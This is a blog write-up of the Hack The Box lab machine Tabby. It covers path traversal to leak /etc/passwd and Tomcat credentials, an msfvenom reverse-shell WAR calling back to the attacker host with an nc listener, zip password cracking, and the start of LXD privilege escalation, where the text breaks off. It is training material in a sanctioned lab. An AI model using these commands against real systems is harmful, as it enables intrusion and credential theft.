<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Daniel Cano">
<meta name="description" content="Writeup about the Hackthebox retired machine Tabby 10.10.10.194">
<meta name="keywords" content="hacking, technology, programming">
<meta name="referrer" content="always">
<meta property="og:description" content="Writeup about the Hackthebox retired machine Tabby 10.10.10.194">
<meta property="og:title" content="Writeup Hackthebox HTB Tabby">
<meta property="og:url" content="https://u915.net/posts/2020/11/writeup-hackthebox-htb-tabby/">
<meta property="og:image" content="https://u915.net/images/logo_small.png" />
<title>Writeup Hackthebox HTB Tabby - u915</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
<link rel="icon" href="/images/favicon.png" type="image/x-icon">
<link rel="shortcut icon" href="/images/favicon_48_48.png">
</head>
<body>
<header>
  <div class="blog-header">
    <h1><a href="https://u915.net/">u915</a></h1>
    <div><a href="https://u915.net/"><img src="/images/logo_small.png" class="bloglogo"></img></a></div><h4>Daniel Cano Merch√°n - Hacking &amp; Tech</h4>
  </div>
  <nav><a href="/">Index</a><a href="/posts/">Posts</a><a href="/tags/">Tags</a><a href="/hacking-tools/">Tools</a><a href="/about/">About</a></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>Writeup Hackthebox HTB Tabby</h1>
  </div>
<div class="meta">
  <div class="meta-bar">2020-11-13
  <span><a href="https://u915.net/tags/hacking/">#Hacking</a></span>
      <span><a href="https://u915.net/tags/hackthebox/">#Hackthebox</a></span>
      <span><a href="https://u915.net/tags/pentesting/">#Pentesting</a></span>
      </div>
  </div>
<div class="content">
  <h2 id="0---basic-info">0 - Basic info</h2>
<p>OS: Linux</p>
<p>IP: 10.10.10.194</p>
<h2 id="1---reconnaissance-and-enumeration">1 - Reconnaissance and enumeration</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS -sV -sC -O 10.10.10.194
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-07-20 17:36 CEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.194
Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
TCP/IP fingerprint:
OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.80%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>7/20%OT<span style="color:#f92672">=</span>22%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>34734%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>I%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>5F15B9F
OS:7%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>105%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10D%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>OPS
OS:<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M54DST11NW7%O2<span style="color:#f92672">=</span>M54DST11NW7%O3<span style="color:#f92672">=</span>M54DNNT11NW7%O4<span style="color:#f92672">=</span>M54DST11NW7%O5<span style="color:#f92672">=</span>M54DST1
OS:1NW7%O6<span style="color:#f92672">=</span>M54DST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FE88%W2<span style="color:#f92672">=</span>FE88%W3<span style="color:#f92672">=</span>FE88%W4<span style="color:#f92672">=</span>FE88%W5<span style="color:#f92672">=</span>FE88%W6<span style="color:#f92672">=</span>FE88<span style="color:#f92672">)</span>ECN
OS:<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>FAF0%O<span style="color:#f92672">=</span>M54DNNSNW7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>A
OS:S%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R
OS:<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F
OS:<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%
OS:T<span style="color:#f92672">=</span>40%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%CD
OS:<span style="color:#f92672">=</span>S<span style="color:#f92672">)</span>                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                           
Network Distance: <span style="color:#ae81ff">2</span> hops                                                                                                                                                                                                                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                                                    
                                                                                                                                                                                                                                           
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                      
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.20 seconds 
</code></pre></div><p>The key ports are SSH (22), Apache(80) and Tomcat(8080)</p>
<p>Testing the port 80 and 8080 reveals that it is a default page:</p>
<p><img src="/images/posts/htb_tabby_1.png" alt="alt text" title="Tomcat default page"></p>
<p>Testing with Nikto:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nikto -host 10.10.10.194 -port <span style="color:#ae81ff">8080</span>
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.194
+ Target Hostname:    10.10.10.194
+ Target Port:        <span style="color:#ae81ff">8080</span>
+ Start Time:         2020-07-20 18:25:03 <span style="color:#f92672">(</span>GMT2<span style="color:#f92672">)</span>
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#39;-C all&#39;</span> to force check all possible dirs<span style="color:#f92672">)</span>
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Allow&#39;</span> Header<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;PUT&#39;</span> method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Allow&#39;</span> Header<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;DELETE&#39;</span> may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/status: Default Tomcat Server Status interface found
+ <span style="color:#ae81ff">8169</span> requests: <span style="color:#ae81ff">0</span> error<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">12</span> item<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> reported on remote host
+ End Time:           2020-07-20 18:31:55 <span style="color:#f92672">(</span>GMT2<span style="color:#f92672">)</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">412</span> seconds<span style="color:#f92672">)</span>
---------------------------------------------------------------------------
</code></pre></div><p>So there is a manager active, but it is asking for username and password:</p>
<p><img src="/images/posts/htb_tabby_3.png" alt="alt text" title="Tomcat default page"></p>
<p>Also the version is leaked:</p>
<p><img src="/images/posts/htb_tabby_4.png" alt="alt text" title="Tomcat default page"></p>
<p>Fuzzing again with Dirbuster</p>
<p><img src="/images/posts/htb_tabby_2.png" alt="alt text" title="Tomcat default page"></p>
<p>There is an interesting news page, with the url parameter <em>file</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.193/news.php?file<span style="color:#f92672">=</span>statement
</code></pre></div><p>I used <em>wfuzz</em> to enumerate more:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hw <span style="color:#ae81ff">0</span> http://10.10.10.194/news.php?file<span style="color:#f92672">=</span>FUZZ
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.194/news.php?file<span style="color:#f92672">=</span>FUZZ
Total requests: 220560

<span style="color:#f92672">===================================================================</span>
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                   
<span style="color:#f92672">===================================================================</span>

000003473:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">150</span> L    <span style="color:#ae81ff">375</span> W    <span style="color:#ae81ff">6507</span> Ch     <span style="color:#e6db74">&#34;statement&#34;</span>                                                                                                                                                               

Total time: 1241.794
Processed Requests: <span style="color:#ae81ff">220560</span>
Filtered Requests: <span style="color:#ae81ff">220559</span>
Requests/sec.: 177.6139

</code></pre></div><p>But nothing else useful was found fuzzing</p>
<h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
<p>Manually checking the get parameter to check path transversal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.194/news.php?file<span style="color:#f92672">=</span>../../../../../../../../../../../../etc/passwd
</code></pre></div><p>Amazing <em>/etc/passwd</em> leaked but not <em>/etc/shadow</em>  :(</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash

</code></pre></div><h2 id="3---exploit">3 - Exploit</h2>
<p>Now taking into consideration that I need a username and password to access to the Tomcat admin panel I tried to leak Tomcat information:</p>
<p>Searching information about the version:</p>
<p><a href="https://ubuntu.pkgs.org/20.04/ubuntu-universe-amd64/tomcat9_9.0.31-1_all.deb.html">https://ubuntu.pkgs.org/20.04/ubuntu-universe-amd64/tomcat9_9.0.31-1_all.deb.html</a></p>
<p>Interesting paths</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/usr/share/tomcat9/etc/catalina.properties
/usr/share/tomcat9/etc/tomcat-users.xml
</code></pre></div><p>Leaking the file <em>tomcat-users.xml</em> with the method described, I got the password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>?&gt;
&lt;!--
  Licensed to the Apache Software Foundation <span style="color:#f92672">(</span>ASF<span style="color:#f92672">)</span> under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work <span style="color:#66d9ef">for</span> additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  <span style="color:#f92672">(</span>the <span style="color:#e6db74">&#34;License&#34;</span><span style="color:#f92672">)</span>; you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an <span style="color:#e6db74">&#34;AS IS&#34;</span> BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License <span style="color:#66d9ef">for</span> the specific language governing permissions and
  limitations under the License.
--&gt;
&lt;tomcat-users xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://tomcat.apache.org/xml&#34;</span>
              xmlns:xsi<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
              xsi:schemaLocation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;</span>
              version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>&gt;
&lt;!--
  NOTE:  By default, no user is included in the <span style="color:#e6db74">&#34;manager-gui&#34;</span> role required
  to operate the <span style="color:#e6db74">&#34;/manager/html&#34;</span> web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you <span style="color:#66d9ef">do</span> NOT use one of the users in the commented out
  section below since they are intended <span style="color:#66d9ef">for</span> use with the examples web
  application.
--&gt;
&lt;!--
  NOTE:  The sample user and role entries below are intended <span style="color:#66d9ef">for</span> use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users <span style="color:#66d9ef">for</span> use with the
  examples web application, <span style="color:#66d9ef">do</span> not forget to remove the &lt;!.. ..&gt; that surrounds
  them. You will also need to set the passwords to something appropriate.
--&gt;
&lt;!--
  &lt;role rolename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tomcat&#34;</span>/&gt;
  &lt;role rolename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;role1&#34;</span>/&gt;
  &lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tomcat&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;must-be-changed&gt;&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tomcat&#34;</span>/&gt;
  &lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;both&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;must-be-changed&gt;&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tomcat,role1&#34;</span>/&gt;
  &lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;role1&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;must-be-changed&gt;&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;role1&#34;</span>/&gt;
--&gt;
   &lt;role rolename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin-gui&#34;</span>/&gt;
   &lt;role rolename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manager-script&#34;</span>/&gt;
   &lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tomcat&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$3<span style="color:#e6db74">cureP4s5w0rd123!&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin-gui,manager-script&#34;</span>/&gt;
&lt;/tomcat-users&gt;

</code></pre></div><p>Ok, so the password is <em>$3cureP4s5w0rd123!</em> and <em>tomcat</em> is the user.</p>
<p>Using the username and password on:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.194:8080/host-manager/html
</code></pre></div><p>I got access to the panel. Now I can upload my evil <em>msfvenom .war</em> to make a reverse shell to my machine</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.28 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> -f war &gt; shell.war
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> exec: msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.28 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> -f war &gt; shell.war

Payload size: <span style="color:#ae81ff">1089</span> bytes
Final size of war file: <span style="color:#ae81ff">1089</span> bytes
</code></pre></div><p>But the access to the apps is restricted to only local!</p>
<p>So I used curl to upload the exploit, maybe the gui is restricted but the command line is not forbidden:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -u <span style="color:#e6db74">&#39;tomcat&#39;</span>:<span style="color:#e6db74">&#39;$3cureP4s5w0rd123!&#39;</span> -T shell.war <span style="color:#e6db74">&#39;http://10.10.10.194:8080/manager/text/deploy?path=/shell&#39;</span>
</code></pre></div><p>And setting up a <em>nc</em> listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvp <span style="color:#ae81ff">1337</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
10.10.10.194: inverse host lookup failed: Unknown host
connect to <span style="color:#f92672">[</span>10.10.14.28<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.194<span style="color:#f92672">]</span> <span style="color:#ae81ff">40534</span>
</code></pre></div><p>Great the reverse shell is running.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">whoami
tomcat
</code></pre></div><p>There is no user.txt flag so first I need to scalate to another user, maybe <em>Ash</em> because the <em>/etc/password</em> found in the beginning.</p>
<p>After a few enumeration I found the path with backup files:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/var/www/html/files
</code></pre></div><p>I just desployed a python http server to exfiltrate the backups:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server <span style="color:#ae81ff">8899</span>
</code></pre></div><p>Getting the file with wget on my local machine</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget 10.10.10.194:8899/16162020_backup.zip
</code></pre></div><p>The zip is password protected so I cracked the zip file with a bruteforce attack:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
possible pw found: admin@it <span style="color:#f92672">()</span>
</code></pre></div><p>Great another password, <em>admin@it</em></p>
<p>Testing the password with user ash and upgrading the shell with Python:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>       
$ su ash
su ash
Password: admin@it 
</code></pre></div><p>Worked so user is gone:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
cd /home/ash

ash@tabby:~$ cat user.txt
cat user.txt
bca58<span style="color:#f92672">[</span>....<span style="color:#f92672">]</span>90f2c

</code></pre></div><h2 id="4---post-exploitation-and-privilege-scalation">4 - Post-Exploitation and privilege scalation</h2>
<p>Enumerating with the user Ash I found the service lxc running:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~/snap/lxd/14804/.config/lxc$ ps -ef | grep lxc
ps -ef | grep lxc
root        <span style="color:#ae81ff">9564</span>       <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">0</span> 17:48 ?        00:00:00 lxcfs /var/snap/lxd/common/var/lib/lxcfs -p /var/snap/lxd/common/lxcfs.pid
root       <span style="color:#ae81ff">11033</span>       <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">0</span> 18:09 ?        00:00:00 <span style="color:#f92672">[</span>lxc monitor<span style="color:#f92672">]</span> /var/snap/lxd/common/lxd/containers ignite
ash        <span style="color:#ae81ff">11398</span>    <span style="color:#ae81ff">9328</span>  <span style="color:#ae81ff">0</span> 18:09 pts/0    00:00:00 lxc exec ignite /bin/sh
root       <span style="color:#ae81ff">11431</span>    <span style="color:#ae81ff">9577</span>  <span style="color:#ae81ff">0</span> 18:09 ?        00:00:00 /snap/lxd/current/bin/lxd forkexec ignite /var/snap/lxd/common/lxd/containers /var/snap/lxd/common/lxd/logs/ignite/lxc.conf  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> -- env PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME<span style="color:#f92672">=</span>/root USER<span style="color:#f92672">=</span>root LANG<span style="color:#f92672">=</span>C.UTF-8 -- cmd /bin/sh
ash        <span style="color:#ae81ff">15145</span>   <span style="color:#ae81ff">14860</span>  <span style="color:#ae81ff">0</span> 19:41 pts/1    00:00:00 grep --color<span style="color:#f92672">=</span>auto lxc

</code></pre></div><p>Interesting, there is a container running</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~/snap/lxd/14804/.config/lxc$ lxc list
lxc list
+--------+---------+--------------------+-----------------------------------------------+-----------+-----------+
|  NAME  |  STATE  |        IPV4        |                     IPV6                      |   TYPE    | SNAPSHOTS |
+--------+---------+--------------------+-----------------------------------------------+-----------+-----------+
| ignite | RUNNING | 10.89.95.44 <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | fd42:338a:8d74:e625:216:3eff:fed1:70b5 <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+--------+---------+--------------------+-----------------------------------------------+-----------+-----------+
</code></pre></div><p>I used this article to scalate privileges, if the user has the group lxd then it is possible to scalate privileges:</p>
<p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
</code></pre></div><p>I was having a bad time with this part because I got a lot of errors trying to setting up the exploit, finally I used /tmp and everything was working fine.</p>
<p>With the generated file alpine-v3*&hellip; I just copied the file to my Desktop and deployed a python http server to serve the exploit to the Tabby machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp alpine-v3.12-x86_64-20200720_2133.tar.gz /home/u915/Escritorio/alpine
</code></pre></div><p>Getting the file and exploit</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget 10.10.14.28:8899/alpine
--2020-07-20 19:49:49--  http://10.10.14.28:8899/alpine
Connecting to 10.10.14.28:8899... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
